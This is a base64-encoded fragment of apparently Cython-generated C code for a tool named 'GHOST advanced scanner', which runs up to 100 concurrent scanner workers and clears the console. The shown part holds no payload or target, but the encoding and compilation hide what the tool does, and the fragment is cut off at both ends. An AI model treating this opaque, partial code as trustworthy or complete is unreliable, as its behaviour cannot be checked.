fdF8zID0gUHlNZXRob2RfR0VUX1NFTEYoX19weXhfdF80KTtcbiAgICAgIGFzc2VydChfX3B5eF90XzMpO1xuICAgICAgUHlPYmplY3QqIF9fcHl4X19mdW5jdGlvbiA9IFB5TWV0aG9kX0dFVF9GVU5DVElPTihfX3B5eF90XzQpO1xuICAgICAgX19QeXhfSU5DUkVGKF9fcHl4X3RfMyk7XG4gICAgICBfX1B5eF9JTkNSRUYoX19weXhfX2Z1bmN0aW9uKTtcbiAgICAgIF9fUHl4X0RFQ1JFRl9TRVQoX19weXhfdF80LCBfX3B5eF9fZnVuY3Rpb24pO1xuICAgICAgX19weXhfdF81ID0gMDtcbiAgICB9XG4gICAgI2VuZGlmXG4gICAge1xuICAgICAgUHlPYmplY3QgKl9fcHl4X2NhbGxhcmdzWzJdID0ge19fcHl4X3RfMywgTlVMTH07XG4gICAgICBfX3B5eF90XzIgPSBfX1B5eF9QeU9iamVjdF9GYXN0Q2FsbCgoUHlPYmplY3QqKV9fcHl4X3RfNCwgX19weXhfY2FsbGFyZ3MrX19weXhfdF81LCAoMS1fX3B5eF90XzUpIHwgKF9fcHl4X3RfNSpfX1B5eF9QWV9WRUNUT1JDQUxMX0FSR1VNRU5UU19PRkZTRVQpKTtcbiAgICAgIF9fUHl4X1hERUNSRUYoX19weXhfdF8zKTsgX19weXhfdF8zID0gMDtcbiAgICAgIF9fUHl4X0RFQ1JFRihfX3B5eF90XzQpOyBfX3B5eF90XzQgPSAwO1xuICAgICAgaWYgKHVubGlrZWx5KCFfX3B5eF90XzIpKSBfX1BZWF9FUlIoMCwgNDI3LCBfX3B5eF9MM19lcnJvcilcbiAgICAgIF9fUHl4X0dPVFJFRihfX3B5eF90XzIpO1xuICAgIH1cbiAgICBfX3B5eF90XzQgPSBfX3B5eF90XzI7XG4gICAgX19weXhfdF8yID0gMDtcbiAgICBfX1B5eF9ERUNSRUYoX19weXhfdF8xKTsgX19weXhfdF8xID0gMDtcbiAgICAge1xuICAgICAge1xuICAgICAgICBfX1B5eF9QeVRocmVhZFN0YXRlX2RlY2xhcmVcbiAgICAgICAgX19QeXhfUHlUaHJlYWRTdGF0ZV9hc3NpZ25cbiAgICAgICAgX19QeXhfRXhjZXB0aW9uU2F2ZSgmX19weXhfdF83LCAmX19weXhfdF84LCAmX19weXhfdF85KTtcbiAgICAgICAgX19QeXhfWEdPVFJFRihfX3B5eF90XzcpO1xuICAgICAgICBfX1B5eF9YR09UUkVGKF9fcHl4X3RfOCk7XG4gICAgICAgIF9fUHl4X1hHT1RSRUYoX19weXhfdF85KTtcbiAgICAgICAgIHtcbiAgICAgICAgICBfX3B5eF92X2V4ZWN1dG9yID0gX19weXhfdF80O1xuICAgICAgICAgIF9fcHl4X3RfNCA9IDA7XG5cbiAgICAgICAgICBcbiAgICAgICAgICBfX3B5eF90XzQgPSBfX1B5eF9QeURpY3RfTmV3UHJlc2l6ZWQoMCk7IGlmICh1bmxpa2VseSghX19weXhfdF80KSkgX19QWVhfRVJSKDAsIDQyOCwgX19weXhfTDdfZXJyb3IpXG4gICAgICAgICAgX19QeXhfR09UUkVGKF9fcHl4X3RfNCk7XG4gICAgICAgICAgX19weXhfdl9mdXR1cmVfdG9fd29ya2VyID0gKChQeU9iamVjdCopX19weXhfdF80KTtcbiAgICAgICAgICBfX3B5eF90XzQgPSAwO1xuXG4gICAgICAgICAgXG4gICAgICAgICAgX19QeXhfSU5DUkVGKF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X2ludF8wKTtcbiAgICAgICAgICBfX3B5eF92X3dvcmtlcl9pZCA9IF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X2ludF8wO1xuXG4gICAgICAgICAgXG4gICAgICAgICAge1xuICAgICAgICAgICAgX19QeXhfUHlUaHJlYWRTdGF0ZV9kZWNsYXJlXG4gICAgICAgICAgICBfX1B5eF9QeVRocmVhZFN0YXRlX2Fzc2lnblxuICAgICAgICAgICAgX19QeXhfRXhjZXB0aW9uU2F2ZSgmX19weXhfdF8xMCwgJl9fcHl4X3RfMTEsICZfX3B5eF90XzEyKTtcbiAgICAgICAgICAgIF9fUHl4X1hHT1RSRUYoX19weXhfdF8xMCk7XG4gICAgICAgICAgICBfX1B5eF9YR09UUkVGKF9fcHl4X3RfMTEpO1xuICAgICAgICAgICAgX19QeXhfWEdPVFJFRihfX3B5eF90XzEyKTtcbiAgICAgICAgICAgICB7XG5cbiAgICAgICAgICAgICAgXG4gICAgICAgICAgICAgIHdoaWxlICgxKSB7XG4gICAgICAgICAgICAgICAgX19weXhfdF80ID0gX19QeXhfUHlPYmplY3RfR2V0QXR0clN0cihfX3B5eF92X3NlbGYsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV9ydW5uaW5nKTsgaWYgKHVubGlrZWx5KCFfX3B5eF90XzQpKSBfX1BZWF9FUlIoMCwgNDMyLCBfX3B5eF9MMTNfZXJyb3IpXG4gICAgICAgICAgICAgICAgX19QeXhfR09UUkVGKF9fcHl4X3RfNCk7XG4gICAgICAgICAgICAgICAgX19weXhfdF8xMyA9IF9fUHl4X1B5T2JqZWN0X0lzVHJ1ZShfX3B5eF90XzQpOyBpZiAodW5saWtlbHkoKF9fcHl4X3RfMTMgPCAwKSkpIF9fUFlYX0VSUigwLCA0MzIsIF9fcHl4X0wxM19lcnJvcilcbiAgICAgICAgICAgICAgICBfX1B5eF9ERUNSRUYoX19weXhfdF80KTsgX19weXhfdF80ID0gMDtcbiAgICAgICAgICAgICAgICBpZiAoIV9fcHl4X3RfMTMpIGJyZWFrO1xuXG4gICAgICAgICAgICAgICAgXG4gICAgICAgICAgICAgICAgX19weXhfdF8xID0gTlVMTDtcblxuICAgICAgICAgICAgICAgIFxuICAgICAgICAgICAgICAgIF9fcHl4X3RfMiA9IF9fcHl4X3BmXzJ0dF81R0hPU1RfMTZhZHZhbmNlZF9zY2FubmVyX2dlbmV4cHIoTlVMTCwgX19weXhfdl9mdXR1cmVfdG9fd29ya2VyKTsgaWYgKHVubGlrZWx5KCFfX3B5eF90XzIpKSBfX1BZWF9FUlIoMCwgNDM0LCBfX3B5eF9MMTNfZXJyb3IpXG4gICAgICAgICAgICAgICAgX19QeXhfR09UUkVGKF9fcHl4X3RfMik7XG4gICAgICAgICAgICAgICAgX19weXhfdF81ID0gMTtcbiAgICAgICAgICAgICAgICB7XG4gICAgICAgICAgICAgICAgICBQeU9iamVjdCAqX19weXhfY2FsbGFyZ3NbMl0gPSB7X19weXhfdF8xLCBfX3B5eF90XzJ9O1xuICAgICAgICAgICAgICAgICAgX19weXhfdF80ID0gX19QeXhfUHlPYmplY3RfRmFzdENhbGwoKFB5T2JqZWN0KilfX3B5eF9idWlsdGluX3N1bSwgX19weXhfY2FsbGFyZ3MrX19weXhfdF81LCAoMi1fX3B5eF90XzUpIHwgKF9fcHl4X3RfNSpfX1B5eF9QWV9WRUNUT1JDQUxMX0FSR1VNRU5UU19PRkZTRVQpKTtcbiAgICAgICAgICAgICAgICAgIF9fUHl4X1hERUNSRUYoX19weXhfdF8xKTsgX19weXhfdF8xID0gMDtcbiAgICAgICAgICAgICAgICAgIF9fUHl4X0RFQ1JFRihfX3B5eF90XzIpOyBfX3B5eF90XzIgPSAwO1xuICAgICAgICAgICAgICAgICAgaWYgKHVubGlrZWx5KCFfX3B5eF90XzQpKSBfX1BZWF9FUlIoMCwgNDMzLCBfX3B5eF9MMTNfZXJyb3IpXG4gICAgICAgICAgICAgICAgICBfX1B5eF9HT1RSRUYoX19weXhfdF80KTtcbiAgICAgICAgICAgICAgICB9XG4gICAgICAgICAgICAgICAgX19QeXhfWERFQ1JFRl9TRVQoX19weXhfdl9hY3RpdmVfd29ya2VycywgX19weXhfdF80KTtcbiAgICAgICAgICAgICAgICBfX3B5eF90XzQgPSAwO1xuXG4gICAgICAgICAgICAgICAgXG4gICAgICAgICAgICAgICAgX19weXhfdF8yID0gX19weXhfdl9zZWxmO1xuICAgICAgICAgICAgICAgIF9fUHl4X0lOQ1JFRihfX3B5eF90XzIpO1xuICAgICAgICAgICAgICAgIF9fcHl4X3RfNSA9IDA7XG4gICAgICAgICAgICAgICAge1xuICAgICAgICAgICAgICAgICAgUHlPYmplY3QgKl9fcHl4X2NhbGxhcmdzWzJdID0ge19fcHl4X3RfMiwgX19weXhfdl9hY3RpdmVfd29ya2Vyc307XG4gICAgICAgICAgICAgICAgICBfX3B5eF90XzQgPSBfX1B5eF9QeU9iamVjdF9GYXN0Q2FsbE1ldGhvZCgoUHlPYmplY3QqKV9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV9zZXRfYWN0aXZlX3RocmVhZHMsIF9fcHl4X2NhbGxhcmdzK19fcHl4X3RfNSwgKDItX19weXhfdF81KSB8ICgxKl9fUHl4X1BZX1ZFQ1RPUkNBTExfQVJHVU1FTlRTX09GRlNFVCkpO1xuICAgICAgICAgICAgICAgICAgX19QeXhfWERFQ1JFRihfX3B5eF90XzIpOyBfX3B5eF90XzIgPSAwO1xuICAgICAgICAgICAgICAgICAgaWYgKHVubGlrZWx5KCFfX3B5eF90XzQpKSBfX1BZWF9FUlIoMCwgNDM1LCBfX3B5eF9MMTNfZXJyb3IpXG4gICAgICAgICAgICAgICAgICBfX1B5eF9HT1RSRUYoX19weXhfdF80KTtcbiAgICAgICAgICAgICAgICB9XG4gICAgICAgICAgICAgICAgX19QeXhfREVDUkVGKF9fcHl4X3RfNCk7IF9fcHl4X3RfNCA9IDA7XG5cbiAgICAgICAgICAgICAgICBcbiAgICAgICAgICAgICAgICB3aGlsZSAoMSkge1xuICAgICAgICAgICAgICAgICAgX19weXhfdF80ID0gUHlPYmplY3RfUmljaENvbXBhcmUoX19weXhfdl9hY3RpdmVfd29ya2VycywgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfaW50XzEwMCwgUHlfTFQpOyBfX1B5eF9YR09UUkVGKF9fcHl4X3RfNCk7IGlmICh1bmxpa2VseSghX19weXhfdF80KSkgX19QWVhfRVJSKDAsIDQzNywgX19weXhfTDEzX2Vycm9yKVxuICAgICAgICAgICAgICAgICAgX19weXhfdF8xMyA9IF9fUHl4X1B5T2JqZWN0X0lzVHJ1ZShfX3B5eF90XzQpOyBpZiAodW5saWtlbHkoKF9fcHl4X3RfMTMgPCAwKSkpIF9fUFlYX0VSUigwLCA0MzcsIF9fcHl4X0wxM19lcnJvcilcbiAgICAgICAgICAgICAgICAgIF9fUHl4X0RFQ1JFRihfX3B5eF90XzQpOyBfX3B5eF90XzQgPSAwO1xuICAgICAgICAgICAgICAgICAgaWYgKCFfX3B5eF90XzEzKSBicmVhaztcblxuICAgICAgICAgICAgICAgICAgXG4gICAgICAgICAgICAgICAgICBfX3B5eF90XzIgPSBfX3B5eF92X2V4ZWN1dG9yO1xuICAgICAgICAgICAgICAgICAgX19QeXhfSU5DUkVGKF9fcHl4X3RfMik7XG5cbiAgICAgICAgICAgICAgICAgIFxuICAgICAgICAgICAgICAgICAgX19weXhfdF8xID0gX19QeXhfUHlPYmplY3RfR2V0QXR0clN0cihfX3B5eF92X3NlbGYsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV9zY2FubmVyX3dvcmtlcik7IGlmICh1bmxpa2VseSghX19weXhfdF8xKSkgX19QWVhfRVJSKDAsIDQzOSwgX19weXhfTDEzX2Vycm9yKVxuICAgICAgICAgICAgICAgICAgX19QeXhfR09UUkVGKF9fcHl4X3RfMSk7XG4gICAgICAgICAgICAgICAgICBfX3B5eF90XzUgPSAwO1xuICAgICAgICAgICAgICAgICAge1xuICAgICAgICAgICAgICAgICAgICBQeU9iamVjdCAqX19weXhfY2FsbGFyZ3NbM10gPSB7X19weXhfdF8yLCBfX3B5eF90XzEsIF9fcHl4X3Zfd29ya2VyX2lkfTtcbiAgICAgICAgICAgICAgICAgICAgX19weXhfdF80ID0gX19QeXhfUHlPYmplY3RfRmFzdENhbGxNZXRob2QoKFB5T2JqZWN0KilfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3Vfc3VibWl0LCBfX3B5eF9jYWxsYXJncytfX3B5eF90XzUsICgzLV9fcHl4X3RfNSkgfCAoMSpfX1B5eF9QWV9WRUNUT1JDQUxMX0FSR1VNRU5UU19PRkZTRVQpKTtcbiAgICAgICAgICAgICAgICAgICAgX19QeXhfWERFQ1JFRihfX3B5eF90XzIpOyBfX3B5eF90XzIgPSAwO1xuICAgICAgICAgICAgICAgICAgICBfX1B5eF9ERUNSRUYoX19weXhfdF8xKTsgX19weXhfdF8xID0gMDtcbiAgICAgICAgICAgICAgICAgICAgaWYgKHVubGlrZWx5KCFfX3B5eF90XzQpKSBfX1BZWF9FUlIoMCwgNDM4LCBfX3B5eF9MMTNfZXJyb3IpXG4gICAgICAgICAgICAgICAgICAgIF9fUHl4X0dPVFJFRihfX3B5eF90XzQpO1xuICAgICAgICAgICAgICAgICAgfVxuICAgICAgICAgICAgICAgICAgX19QeXhfWERFQ1JFRl9TRVQoX19weXhfdl9mdXR1cmUsIF9fcHl4X3RfNCk7XG4gICAgICAgICAgICAgICAgICBfX3B5eF90XzQgPSAwO1xuXG4gICAgICAgICAgICAgICAgICBcbiAgICAgICAgICAgICAgICAgIGlmICh1bmxpa2VseSgoUHlEaWN0X1NldEl0ZW0oX19weXhfdl9mdXR1cmVfdG9fd29ya2VyLCBfX3B5eF92X3dvcmtlcl9pZCwgX19weXhfdl9mdXR1cmUpIDwgMCkpKSBfX1BZWF9FUlIoMCwgNDQwLCBfX3B5eF9MMTNfZXJyb3IpXG5cbiAgICAgICAgICAgICAgICAgIFxuICAgICAgICAgICAgICAgICAgX19weXhfdF80ID0gX19QeXhfUHlMb25nX0FkZE9iakMoX19weXhfdl93b3JrZXJfaWQsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X2ludF8xLCAxLCAxLCAwKTsgaWYgKHVubGlrZWx5KCFfX3B5eF90XzQpKSBfX1BZWF9FUlIoMCwgNDQxLCBfX3B5eF9MMTNfZXJyb3IpXG4gICAgICAgICAgICAgICAgICBfX1B5eF9HT1RSRUYoX19weXhfdF80KTtcbiAgICAgICAgICAgICAgICAgIF9fUHl4X0RFQ1JFRl9TRVQoX19weXhfdl93b3JrZXJfaWQsIF9fcHl4X3RfNCk7XG4gICAgICAgICAgICAgICAgICBfX3B5eF90XzQgPSAwO1xuXG4gICAgICAgICAgICAgICAgICBcbiAgICAgICAgICAgICAgICAgIF9fcHl4X3RfNCA9IF9fUHl4X1B5TG9uZ19BZGRPYmpDKF9fcHl4X3ZfYWN0aXZlX3dvcmtlcnMsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X2ludF8xLCAxLCAxLCAwKTsgaWYgKHVubGlrZWx5KCFfX3B5eF90XzQpKSBfX1BZWF9FUlIoMCwgNDQyLCBfX3B5eF9MMTNfZXJyb3IpXG4gICAgICAgICAgICAgICAgICBfX1B5eF9HT1RSRUYoX19weXhfdF80KTtcbiAgICAgICAgICAgICAgICAgIF9fUHl4X0RFQ1JFRl9TRVQoX19weXhfdl9hY3RpdmVfd29ya2VycywgX19weXhfdF80KTtcbiAgICAgICAgICAgICAgICAgIF9fcHl4X3RfNCA9IDA7XG5cbiAgICAgICAgICAgICAgICAgIFxuICAgICAgICAgICAgICAgICAgX19weXhfdF8xID0gX19weXhfdl9zZWxmO1xuICAgICAgICAgICAgICAgICAgX19QeXhfSU5DUkVGKF9fcHl4X3RfMSk7XG4gICAgICAgICAgICAgICAgICBfX3B5eF90XzUgPSAwO1xuICAgICAgICAgICAgICAgICAge1xuICAgICAgICAgICAgICAgICAgICBQeU9iamVjdCAqX19weXhfY2FsbGFyZ3NbMl0gPSB7X19weXhfdF8xLCBfX3B5eF92X2FjdGl2ZV93b3JrZXJzfTtcbiAgICAgICAgICAgICAgICAgICAgX19weXhfdF80ID0gX19QeXhfUHlPYmplY3RfRmFzdENhbGxNZXRob2QoKFB5T2JqZWN0KilfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3Vfc2V0X2FjdGl2ZV90aHJlYWRzLCBfX3B5eF9jYWxsYXJncytfX3B5eF90XzUsICgyLV9fcHl4X3RfNSkgfCAoMSpfX1B5eF9QWV9WRUNUT1JDQUxMX0FSR1VNRU5UU19PRkZTRVQpKTtcbiAgICAgICAgICAgICAgICAgICAgX19QeXhfWERFQ1JFRihfX3B5eF90XzEpOyBfX3B5eF90XzEgPSAwO1xuICAgICAgICAgICAgICAgICAgICBpZiAodW5saWtlbHkoIV9fcHl4X3RfNCkpIF9fUFlYX0VSUigwLCA0NDMsIF9fcHl4X0wxM19lcnJvcilcbiAgICAgICAgICAgICAgICAgICAgX19QeXhfR09UUkVGKF9fcHl4X3RfNCk7XG4gICAgICAgICAgICAgICAgICB9XG4gICAgICAgICAgICAgICAgICBfX1B5eF9ERUNSRUYoX19weXhfdF80KTsgX19weXhfdF80ID0gMDtcbiAgICAgICAgICAgICAgICB9XG5cbiAgICAgICAgICAgICAgICBcbiAgICAgICAgICAgICAgICB7IFxuICAgICAgICAgICAgICAgICAgX19weXhfdF80ID0gUHlEaWN0X05ldygpOyBpZiAodW5saWtlbHkoIV9fcHl4X3RfNCkpIF9fUFlYX0VSUigwLCA0NDUsIF9fcHl4X0wyNV9lcnJvcilcbiAgICAgICAgICAgICAgICAgIF9fUHl4X0dPVFJFRihfX3B5eF90XzQpO1xuXG4gICAgICAgICAgICAgICAgICBcbiAgICAgICAgICAgICAgICAgIF9fcHl4X3RfMTQgPSAwO1xuICAgICAgICAgICAgICAgICAgX19weXhfdF8yID0gX19QeXhfZGljdF9pdGVyYXRvcihfX3B5eF92X2Z1dHVyZV90b193b3JrZXIsIDEsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV9pdGVtcywgKCZfX3B5eF90XzE1KSwgKCZfX3B5eF90XzE2KSk7IGlmICh1bmxpa2VseSghX19weXhfdF8yKSkgX19QWVhfRVJSKDAsIDQ0NiwgX19weXhfTDI1X2Vycm9yKVxuICAgICAgICAgICAgICAgICAgX19QeXhfR09UUkVGKF9fcHl4X3RfMik7XG4gICAgICAgICAgICAgICAgICBfX1B5eF9YREVDUkVGKF9fcHl4X3RfMSk7XG4gICAgICAgICAgICAgICAgICBfX3B5eF90XzEgPSBfX3B5eF90XzI7XG4gICAgICAgICAgICAgICAgICBfX3B5eF90XzIgPSAwO1xuICAgICAgICAgICAgICAgICAgd2hpbGUgKDEpIHtcbiAgICAgICAgICAgICAgICAgICAgX19weXhfdF8xNyA9IF9fUHl4X2RpY3RfaXRlcl9uZXh0KF9fcHl4X3RfMSwgX19weXhfdF8xNSwgJl9fcHl4X3RfMTQsICZfX3B5eF90XzIsICZfX3B5eF90XzMsIE5VTEwsIF9fcHl4X3RfMTYpO1xuICAgICAgICAgICAgICAgICAgICBpZiAodW5saWtlbHkoX19weXhfdF8xNyA9PSAwKSkgYnJlYWs7XG4gICAgICAgICAgICAgICAgICAgIGlmICh1bmxpa2VseShfX3B5eF90XzE3ID09IC0xKSkgX19QWVhfRVJSKDAsIDQ0NiwgX19weXhfTDI1X2Vycm9yKVxuICAgICAgICAgICAgICAgICAgICBfX1B5eF9HT1RSRUYoX19weXhfdF8yKTtcbiAgICAgICAgICAgICAgICAgICAgX19QeXhfR09UUkVGKF9fcHl4X3RfMyk7XG4gICAgICAgICAgICAgICAgICAgIF9fUHl4X1hERUNSRUZfU0VUKF9fcHl4XzhnZW5leHByNF9fcHl4X3Zfd2lkLCBfX3B5eF90XzIpO1xuICAgICAgICAgICAgICAgICAgICBfX3B5eF90XzIgPSAwO1xuICAgICAgICAgICAgICAgICAgICBfX1B5eF9YREVDUkVGX1NFVChfX3B5eF84Z2VuZXhwcjRfX3B5eF92X2Z1dHVyZSwgX19weXhfdF8zKTtcbiAgICAgICAgICAgICAgICAgICAgX19weXhfdF8zID0gMDtcbiAgICAgICAgICAgICAgICAgICAgX19weXhfdF8yID0gX19weXhfOGdlbmV4cHI0X19weXhfdl9mdXR1cmU7XG4gICAgICAgICAgICAgICAgICAgIF9fUHl4X0lOQ1JFRihfX3B5eF90XzIpO1xuICAgICAgICAgICAgICAgICAgICBfX3B5eF90XzUgPSAwO1xuICAgICAgICAgICAgICAgICAgICB7XG4gICAgICAgICAgICAgICAgICAgICAgUHlPYmplY3QgKl9fcHl4X2NhbGxhcmdzWzJdID0ge19fcHl4X3RfMiwgTlVMTH07XG4gICAgICAgICAgICAgICAgICAgICAgX19weXhfdF8zID0gX19QeXhfUHlPYmplY3RfRmFzdENhbGxNZXRob2QoKFB5T2JqZWN0KilfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3VfZG9uZSwgX19weXhfY2FsbGFyZ3MrX19weXhfdF81LCAoMS1fX3B5eF90XzUpIHwgKDEqX19QeXhfUFlfVkVDVE9SQ0FMTF9BUkdVTUVOVFNfT0ZGU0VUKSk7XG4gICAgICAgICAgICAgICAgICAgICAgX19QeXhfWERFQ1JFRihfX3B5eF90XzIpOyBfX3B5eF90XzIgPSAwO1xuICAgICAgICAgICAgICAgICAgICAgIGlmICh1bmxpa2VseSghX19weXhfdF8zKSkgX19QWVhfRVJSKDAsIDQ0NiwgX19weXhfTDI1X2Vycm9yKVxuICAgICAgICAgICAgICAgICAgICAgIF9fUHl4X0dPVFJFRihfX3B5eF90XzMpO1xuICAgICAgICAgICAgICAgICAgICB9XG4gICAgICAgICAgICAgICAgICAgIF9fcHl4X3RfMTMgPSBfX1B5eF9QeU9iamVjdF9Jc1RydWUoX19weXhfdF8zKTsgaWYgKHVubGlrZWx5KChfX3B5eF90XzEzIDwgMCkpKSBfX1BZWF9FUlIoMCwgNDQ2LCBfX3B5eF9MMjVfZXJyb3IpXG4gICAgICAgICAgICAgICAgICAgIF9fUHl4X0RFQ1JFRihfX3B5eF90XzMpOyBfX3B5eF90XzMgPSAwO1xuICAgICAgICAgICAgICAgICAgICBfX3B5eF90XzE4ID0gKCFfX3B5eF90XzEzKTtcbiAgICAgICAgICAgICAgICAgICAgaWYgKF9fcHl4X3RfMTgpIHtcbiAgICAgICAgICAgICAgICAgICAgICBpZiAodW5saWtlbHkoUHlEaWN0X1NldEl0ZW0oX19weXhfdF80LCAoUHlPYmplY3QqKV9fcHl4XzhnZW5leHByNF9fcHl4X3Zfd2lkLCAoUHlPYmplY3QqKV9fcHl4XzhnZW5leHByNF9fcHl4X3ZfZnV0dXJlKSkpIF9fUFlYX0VSUigwLCA0NDYsIF9fcHl4X0wyNV9lcnJvcilcbiAgICAgICAgICAgICAgICAgICAgfVxuICAgICAgICAgICAgICAgICAgfVxuICAgICAgICAgICAgICAgICAgX19QeXhfREVDUkVGKF9fcHl4X3RfMSk7IF9fcHl4X3RfMSA9IDA7XG4gICAgICAgICAgICAgICAgICBfX1B5eF9YREVDUkVGKF9fcHl4XzhnZW5leHByNF9fcHl4X3ZfZnV0dXJlKTsgX19weXhfOGdlbmV4cHI0X19weXhfdl9mdXR1cmUgPSAwO1xuICAgICAgICAgICAgICAgICAgX19QeXhfWERFQ1JFRihfX3B5eF84Z2VuZXhwcjRfX3B5eF92X3dpZCk7IF9fcHl4XzhnZW5leHByNF9fcHl4X3Zfd2lkID0gMDtcbiAgICAgICAgICAgICAgICAgIGdvdG8gX19weXhfTDI5X2V4aXRfc2NvcGU7XG4gICAgICAgICAgICAgICAgICBfX3B5eF9MMjVfZXJyb3I6O1xuICAgICAgICAgICAgICAgICAgX19QeXhfWERFQ1JFRihfX3B5eF84Z2VuZXhwcjRfX3B5eF92X2Z1dHVyZSk7IF9fcHl4XzhnZW5leHByNF9fcHl4X3ZfZnV0dXJlID0gMDtcbiAgICAgICAgICAgICAgICAgIF9fUHl4X1hERUNSRUYoX19weXhfOGdlbmV4cHI0X19weXhfdl93aWQpOyBfX3B5eF84Z2VuZXhwcjRfX3B5eF92X3dpZCA9IDA7XG4gICAgICAgICAgICAgICAgICBnb3RvIF9fcHl4X0wxM19lcnJvcjtcbiAgICAgICAgICAgICAgICAgIF9fcHl4X0wyOV9leGl0X3Njb3BlOjtcbiAgICAgICAgICAgICAgICB9IFxuICAgICAgICAgICAgICAgIF9fUHl4X0RFQ1JFRl9TRVQoX19weXhfdl9mdXR1cmVfdG9fd29ya2VyLCAoKFB5T2JqZWN0KilfX3B5eF90XzQpKTtcbiAgICAgICAgICAgICAgICBfX3B5eF90XzQgPSAwO1xuXG4gICAgICAgICAgICAgICAgXG4gICAgICAgICAgICAgICAgX19weXhfdF8xID0gTlVMTDtcbiAgICAgICAgICAgICAgICBfX1B5eF9HZXRNb2R1bGVHbG9iYWxOYW1lKF9fcHl4X3RfMywgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X29zKTsgaWYgKHVubGlrZWx5KCFfX3B5eF90XzMpKSBfX1BZWF9FUlIoMCwgNDQ4LCBfX3B5eF9MMTNfZXJyb3IpXG4gICAgICAgICAgICAgICAgX19QeXhfR09UUkVGKF9fcHl4X3RfMyk7XG4gICAgICAgICAgICAgICAgX19weXhfdF8yID0gX19QeXhfUHlPYmplY3RfR2V0QXR0clN0cihfX3B5eF90XzMsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV9zeXN0ZW0pOyBpZiAodW5saWtlbHkoIV9fcHl4X3RfMikpIF9fUFlYX0VSUigwLCA0NDgsIF9fcHl4X0wxM19lcnJvcilcbiAgICAgICAgICAgICAgICBfX1B5eF9HT1RSRUYoX19weXhfdF8yKTtcbiAgICAgICAgICAgICAgICBfX1B5eF9ERUNSRUYoX19weXhfdF8zKTsgX19weXhfdF8zID0gMDtcbiAgICAgICAgICAgICAgICBfX1B5eF9HZXRNb2R1bGVHbG9iYWxOYW1lKF9fcHl4X3RfMTksIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV9vcyk7IGlmICh1bmxpa2VseSghX19weXhfdF8xOSkpIF9fUFlYX0VSUigwLCA0NDgsIF9fcHl4X0wxM19lcnJvcilcbiAgICAgICAgICAgICAgICBfX1B5eF9HT1RSRUYoX19weXhfdF8xOSk7XG4gICAgICAgICAgICAgICAgX19weXhfdF8yMCA9IF9fUHl4X1B5T2JqZWN0X0dldEF0dHJTdHIoX19weXhfdF8xOSwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X25hbWUpOyBpZiAodW5saWtlbHkoIV9fcHl4X3RfMjApKSBfX1BZWF9FUlIoMCwgNDQ4LCBfX3B5eF9MMTNfZXJyb3IpXG4gICAgICAgICAgICAgICAgX19QeXhfR09UUkVGKF9fcHl4X3RfMjApO1xuICAgICAgICAgICAgICAgIF9fUHl4X0RFQ1JFRihfX3B5eF90XzE5KTsgX19weXhfdF8xOSA9IDA7XG4gICAgICAgICAgICAgICAgX19weXhfdF8xOCA9IChfX1B5eF9QeVVuaWNvZGVfRXF1YWxzKF9fcHl4X3RfMjAsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV9udCwgUHlfRVEpKTsgaWYgKHVubGlrZWx5KChfX3B5eF90XzE4IDwgMCkpKSBfX1BZWF9FUlIoMCwgNDQ4LCBfX3B5eF9MMTNfZXJyb3IpXG4gICAgICAgICAgICAgICAgX19QeXhfREVDUkVGKF9fcHl4X3RfMjApOyBfX3B5eF90XzIwID0gMDtcbiAgICAgICAgICAgICAgICBpZiAoX19weXhfdF8xOCkge1xuICAgICAgICAgICAgICAgICAgX19QeXhfSU5DUkVGKF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV9jbHMpO1xuICAgICAgICAgICAgICAgICAgX19weXhfdF8zID0gX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X2NscztcbiAgICAgICAgICAgICAgICB9IGVsc2Uge1xuICAgICAgICAgICAgICAgICAgX19QeXhfSU5DUkVGKF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV9jbGVhcik7XG4gICAgICAgICAgICAgICAgICBfX3B5eF90XzMgPSBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3VfY2xlYXI7XG4gICAgICAgICAgICAgICAgfVxuICAgICAgICAgICAgICAgIF9fcHl4X3RfNSA9IDE7XG4gICAgICAgICAgICAgICAgI2lmIENZVEhPTl9VTlBBQ0tfTUVUSE9EU1xuICAgICAgICAgICAgICAgIGlmICh1bmxpa2VseShQeU1ldGhvZF9DaGVjayhfX3B5eF90XzIpKSkge1xuICAgICAgICAgICAgICAgICAgX19weXhfdF8xID0gUHlNZXRob2RfR0VUX1NFTEYoX19weXhfdF8yKTtcbiAgICAgICAgICAgICAgICAgIGFzc2VydChfX3B5eF90XzEpO1xuICAgICAgICAgICAgICAgICAgUHlPYmplY3QqIF9fcHl4X19mdW5jdGlvbiA9IFB5TWV0aG9kX0dFVF9GVU5DVElPTihfX3B5eF90XzIpO1xuICAgICAgICAgICAgICAgICAgX19QeXhfSU5DUkVGKF9fcHl4X3RfMSk7XG4gICAgICAgICAgICAgICAgICBfX1B5eF9JTkNSRUYoX19weXhfX2Z1bmN0aW9uKTtcbiAgICAgICAgICAgICAgICAgIF9fUHl4X0RFQ1JFRl9TRVQoX19weXhfdF8yLCBfX3B5eF9fZnVuY3Rpb24pO1xuICAgICAgICAgICAgICAgICAgX19weXhfdF81ID0gMDtcbiAgICAgICAgICAgICAgICB9XG4gICAgICAgICAgICAgICAgI2VuZGlmXG4gICAgICAgICAgICAgICAge1xuICAgICAgICAgICAgICAgICAgUHlPYmplY3QgKl9fcHl4X2NhbGxhcmdzWzJdID0ge19fcHl4X3Rf